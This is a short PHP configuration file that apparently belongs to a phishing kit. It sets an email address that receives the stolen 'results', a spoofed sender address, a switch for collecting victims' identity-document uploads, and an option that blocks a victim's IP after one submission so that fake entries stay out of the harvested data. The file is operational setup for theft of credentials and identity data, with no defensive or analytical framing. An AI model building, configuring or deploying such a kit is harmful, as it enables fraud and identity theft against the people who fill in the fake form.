<?php

$Your_Email = "spammingmafia746@gmail.com";  // Set your email
$From_Address = "<curtis@freakin.ez>";  // Address your results will apear to come from
$iden=true; // For Identity Upload (true/false)
$Abuse_Filter=true; // Block absuive text 
$One_Time_Access=true; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending multiple fake forms

?>